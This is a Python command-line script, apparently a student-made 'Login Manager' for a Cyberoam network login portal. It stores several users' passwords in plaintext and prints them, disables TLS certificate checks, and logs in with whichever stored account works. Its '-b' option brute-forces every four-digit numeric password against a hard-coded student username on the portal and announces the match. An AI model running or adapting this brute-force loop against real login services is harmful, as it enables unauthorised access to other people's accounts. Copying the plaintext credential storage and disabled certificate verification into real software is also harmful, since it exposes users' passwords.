#!/usr/bin/python3

import sys
import requests
import urllib3
import json
from collections import defaultdict
from terminaltables import AsciiTable
from pyfiglet import Figlet
import itertools
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
credentials = defaultdict(dict)
LOGIN_ENDPOINT = 'https://10.1.0.10:8090/httpclient.html'
f = Figlet(font='slant')
DEFAULT_USER_ID = 'shreyas'

def add_user(displayname,username,password):
    # Store in a file
    credentials = dict(json.load(open('credentials.json')))
    credentials[displayname] = {}
    credentials[displayname]['username'] = username
    credentials[displayname]['password'] = password
    with open('credentials.json','w') as outfile:
        json.dump(credentials,outfile)

def remove_user(displayname):
    cred_dicts = dict(json.load(open('credentials.json')))
    del cred_dicts[displayname]
    with open('credentials.json','w') as outfile:
        json.dump(cred_dicts,outfile)

def show_users():
    cred_dicts = dict(json.load(open('credentials.json')))
    cred_list = [['Display Name','Username','Password']]
    for cred in cred_dicts:
        cred_list.append([cred,cred_dicts[cred]['username'],cred_dicts[cred]['password']])
    table = AsciiTable(cred_list)
    print(table.table)

def populate():
    global credentials
    credentials = dict(json.load(open('credentials.json')))
    for credential in credentials:
        credentials[credential]['mode'] = 191

def login(username):
    PARAMS = credentials[username]
    response = requests.post(url=LOGIN_ENDPOINT,data=PARAMS,verify=False)
    content = response.content.decode('utf-8').split('><')
    content = [i[8:-2] for i in content if 'CDATA' in i and i[8:-2] is not ''][1:]
    return content[0]

def main():
    populate()
    exceeded = False
    for user in credentials:
        response = login(user)
        if 'successfully' in response:
            print(response,'as',user)
            break
        else:
            exceeded = True

def brute_force():

    chars = "1234567890"
    count = 4
    for item in itertools.product(chars, repeat=count):
        init = time.time()
        password = "".join(item)
        print(password)
        PARAMS = {'username':'f20150036','password':password,'mode':191}
        response = requests.post(url=LOGIN_ENDPOINT,data=PARAMS,verify=False)
        content = response.content.decode('utf-8').split('><')
        content = [i[8:-2] for i in content if 'CDATA' in i and i[8:-2] is not ''][1:]
        print(content[0])
        if 'successfully' in content[0]:
            print("Hogyaa",password)
            break
        fin = time.time()
        print("Time:",fin - init)


if __name__ == '__main__':
    print(f.renderText('Login Manager'))
    if len(sys.argv) == 1:
        main()
    elif sys.argv[1] == '-a' :
        displayname = input('Enter new user\'s displayname:')
        username = input('Enter username: ')
        password = input('Enter password: ')
        add_user(displayname,username,password)
        show_users()
    elif sys.argv[1] == '-s':
        show_users()
    elif sys.argv[1] == '-r':
        displayname = input('User to remove: ')
        remove_user(displayname)
        show_users()
    elif sys.argv[1] == '-b':
        brute_force()
    elif sys.argv[1] == '-d':
        populate()
        if len(sys.argv) < 3:
            print(login(DEFAULT_USER_ID),'as',DEFAULT_USER_ID)
        else:
            print(login(sys.argv[2]),'as',sys.argv[2])    
    elif sys.argv[1] == '-help':
        print('Login Manager: A Cyberroam CLI to auto login various user ids')
        print()
        print('Options Available')
        print('-d  |   Use default login user id')
        print('-a  |   Add a new user\'s credentials or for update')
        print('-r  |   Remove a user\'s credentials')
        print('-s  |   Shows all user credentials')
        print('-b  |   Brute force password on a username')
